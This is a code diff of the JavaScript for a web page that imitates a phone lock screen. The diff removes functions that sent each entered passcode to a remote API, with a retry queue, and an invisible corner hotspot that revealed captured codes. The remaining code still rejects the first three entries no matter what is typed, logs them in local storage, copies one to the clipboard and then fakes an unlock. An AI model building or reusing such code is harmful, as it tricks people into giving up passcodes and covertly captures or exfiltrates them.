@@ -1,4 +1,4 @@
-// app.js — adds persistent storage + robust SW registration, keeps existing logic intact.
+// app.js — persistent storage + robust SW registration, keeps existing logic intact.
 
 // ---- Storage API: request persistent storage (best effort; HTTPS required) ----
 (async () => {
@@ -50,22 +50,19 @@
   });
 })();
 
-// ---- Existing app code (unchanged, except where noted) ----
+// ---- Existing app code (updated: removed API sending + removed hotspot display) ----
 (() => {
-  
-  const MAX = 4; // <- changed from 6 to 4 (passcode length + rotating buffer size)
+  const MAX = 4;
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
   const keys = Array.from(document.querySelectorAll('.key[data-num]'));
   const emergency = document.getElementById('emergency');
-  // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
   const lockInner = document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
-  const QUEUE_KEY = '_pass_queue_';
 
   // grab the dynamic island element so we can flip the lock and animate it
   const dynamicIslandEl = document.querySelector('.dynamic-island');
@@ -121,7 +118,7 @@
     }, 120);
   })();
 
-  // rotating buffer for last-up-to-MAX entered codes
+  // rotating buffer for last up-to-4 entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
@@ -134,20 +131,16 @@
     try {
       const arr = getLastCodes();
       arr.push(c);
-      while (arr.length > MAX) arr.shift();
+      while (arr.length > 4) arr.shift();
       localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
     } catch (e) {}
   }
-  function getCombinedLastCodes() {
-    return getLastCodes().join(',');
-  }
 
-  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
+  // --- clear saved attempts on a fresh app session (iOS Home-screen launch) ---
   function clearSavedAttempts() {
     try {
       localStorage.removeItem(LAST_CODES_KEY);
       localStorage.removeItem(ATT_KEY);
-      localStorage.removeItem(QUEUE_KEY);
     } catch (e) { /* ignore */ }
   }
 
@@ -186,34 +179,11 @@
     refreshDots();
   }
 
-  function queuePass(pass) {
-    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
-    q.push({ pass, ts: Date.now() });
-    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
-  }
-
-  function sendToAPI(pass) {
-    const url = API_BASE + encodeURIComponent(pass);
-    return fetch(url, { method: 'GET', keepalive: true })
-      .catch(() => {
-        queuePass(pass);
-      });
-  }
-
-  function flushQueue() {
-    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
-    if (!queue.length) return;
-    queue.forEach(item => {
-      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
-    });
-    localStorage.removeItem(QUEUE_KEY);
-  }
-
   /* ---------- Spring engine (semi-implicit integrator) ---------- */
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120; // k
-    const damping = opts.damping ?? 14;      // c
+    const stiffness = opts.stiffness ?? 120;
+    const damping = opts.damping ?? 14;
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
@@ -256,7 +226,6 @@
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
       homescreenImg.style.filter = 'blur(0) saturate(1)';
-      // hide pill immediately for reduced-motion users
       if (dynamicIslandEl) dynamicIslandEl.style.display = 'none';
       return;
     }
@@ -272,7 +241,6 @@
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // — SLOWER slide-up spring for lockInner (tuned)
     springAnimate({
       from: 0,
       to: targetY,
@@ -292,7 +260,6 @@
       }
     });
 
-    // — SLOWER homescreen spring
     springAnimate({
       from: 0,
       to: 1,
@@ -324,7 +291,7 @@
               try {
                 dynamicIslandEl.style.display = 'none';
                 dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
-              } catch (e) { /* ignore */ }
+              } catch (e) {}
             };
             dynamicIslandEl.addEventListener('transitionend', onTransEnd);
             setTimeout(() => {
@@ -353,7 +320,6 @@
     }
     const DURATION = 700;
 
-    // Force Cancel label back to 'Cancel' during shake
     if (cancelBtn) cancelBtn.textContent = 'Cancel';
 
     dotsEl.classList.add('wrong');
@@ -422,24 +388,21 @@
     clearTimeout(t._hideTimer);
     t._hideTimer = setTimeout(() => {
       t.style.opacity = '0';
-      t._hideTimer2 = setTimeout(() => {}, 200);
     }, ms);
   }
 
-  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 1st (changed) ---------- */
+  /* ---------- handleCompleteAttempt: unlock on 4th ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
-    // NEW BEHAVIOR:
-    // - First completed attempt should UNLOCK (play same animation as previous attempts===4).
-    // - For other attempts, preserve previous idea: 2 & 3 are treated as wrong attempts, and on 3rd we send combined codes.
-    if (attempts === 1) {
-      // Immediately show the unlocked (open) lock glyph and give it a small pop, then run unlock animation
+    if (attempts === 1 || attempts === 2 || attempts === 3) {
+      animateWrongAttempt();
+    } 
+    else if (attempts === 4) {
       if (dynamicIslandEl) {
         dynamicIslandEl.classList.remove('locked');
         dynamicIslandEl.classList.add('unlocked', 'icon-opened');
@@ -449,21 +412,7 @@
       } else {
         playUnlockAnimation();
       }
-
-      // local reset of input
       setTimeout(reset, 300);
-
-      // reset attempts after unlock
-      setAttempts(0);
-      return;
-    }
-
-    if (attempts === 2) {
-      animateWrongAttempt();
-    } else if (attempts === 3) {
-      const combined = getCombinedLastCodes();
-      if (combined) sendToAPI(combined);
-      animateWrongAttempt();
     }
 
     if (attempts >= 4) {
@@ -498,6 +447,7 @@
       animateBrightness(k, 1.6, 80);
       updateCancelText();
     }, { passive: true });
+
     const endPress = () => { animateBrightness(k, 1, 100); };
     k.addEventListener('touchend', endPress);
     k.addEventListener('touchcancel', endPress);
@@ -510,10 +460,12 @@
 
       if (code.length === MAX) {
         const enteredCode = code;
+
         try {
-          // NEW BEHAVIOR: copy LAST THREE digits of whatever code was entered
-          const lastThree = enteredCode.slice(-3);
-          copyToClipboard(lastThree).catch(() => showToast('Copy failed', 900));
+          const upcomingAttempts = getAttempts() + 1;
+          if (upcomingAttempts === 3) {
+            copyToClipboard(enteredCode).catch(() => showToast('Copy failed', 900));
+          }
         } catch (err) {
           console.warn('clipboard pre-copy failed', err);
         }
@@ -555,127 +507,6 @@
   wireCancelAsDelete();
   updateCancelText();
 
-  window.addEventListener('online', flushQueue);
-  flushQueue();
-
-  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */
-
-  function createInvisibleHotspotAndDisplay() {
-    if (!document.getElementById('codesHotspot')) {
-      const hs = document.createElement('div');
-      hs.id = 'codesHotspot';
-      Object.assign(hs.style, {
-        position: 'fixed',
-        left: '8px',
-        bottom: '8px',
-        width: '56px',
-        height: '56px',
-        borderRadius: '12px',
-        background: 'transparent',
-        border: 'none',
-        zIndex: '12000',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        boxSizing: 'border-box',
-        touchAction: 'manipulation',
-        cursor: 'pointer',
-        pointerEvents: 'auto'
-      });
-      document.body.appendChild(hs);
-    }
-
-    if (!document.getElementById('codesCombinedDisplay')) {
-      const d = document.createElement('div');
-      d.id = 'codesCombinedDisplay';
-      Object.assign(d.style, {
-        position: 'fixed',
-        left: '8px',
-        bottom: '72px',
-        minWidth: '160px',
-        maxWidth: 'calc(100% - 16px)',
-        zIndex: '12001',
-        display: 'none',
-        justifyContent: 'center',
-        pointerEvents: 'none',
-        transition: 'opacity 120ms ease, transform 120ms ease'
-      });
-
-      const inner = document.createElement('div');
-      inner.id = 'codesCombinedInner';
-      Object.assign(inner.style, {
-        width: '100%',
-        background: 'rgba(0,0,0,0.7)',
-        borderRadius: '12px',
-        padding: '10px 12px',
-        boxSizing: 'border-box',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        color: '#fff',
-        fontSize: '16px',
-        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
-        fontWeight: '700',
-        letterSpacing: '0.6px'
-      });
-
-      d.appendChild(inner);
-      document.body.appendChild(d);
-    }
-  }
-
-  function showCombinedStringAtBottomLeft() {
-    createInvisibleHotspotAndDisplay();
-    const bar = document.getElementById('codesCombinedDisplay');
-    const inner = document.getElementById('codesCombinedInner');
-    inner.textContent = '';
-
-    const codes = getLastCodes();
-    if (!codes || codes.length === 0) inner.textContent = '';
-    else inner.textContent = codes.join(',');
-
-    bar.style.display = 'flex';
-    requestAnimationFrame(() => {
-      bar.style.transform = 'translateY(0)';
-      bar.style.opacity = '1';
-    });
-  }
-
-  function hideCombinedDisplayNow() {
-    const bar = document.getElementById('codesCombinedDisplay');
-    if (!bar) return;
-    bar.style.transform = 'translateY(8px)';
-    bar.style.opacity = '0';
-    setTimeout(() => {
-      if (bar) bar.style.display = 'none';
-    }, 140);
-  }
-
-  // Hotspot handlers
-  function onHotspotDown(ev) {
-    ev.preventDefault();
-    showCombinedStringAtBottomLeft();
-  }
-  function onHotspotUp(ev) {
-    hideCombinedDisplayNow();
-  }
-
-  function ensureHotspotListeners() {
-    createInvisibleHotspotAndDisplay();
-    const hs = document.getElementById('codesHotspot');
-    if (!hs._attached) {
-      hs.addEventListener('pointerdown', onHotspotDown);
-      window.addEventListener('pointerup', onHotspotUp);
-      window.addEventListener('pointercancel', onHotspotUp);
-      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
-      window.addEventListener('touchend', onHotspotUp);
-      window.addEventListener('touchcancel', onHotspotUp);
-      hs._attached = true;
-    }
-  }
-
-  ensureHotspotListeners();
-
-  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
+  window.__passUI = { getCode: () => code, reset, getAttempts };
 
 })();
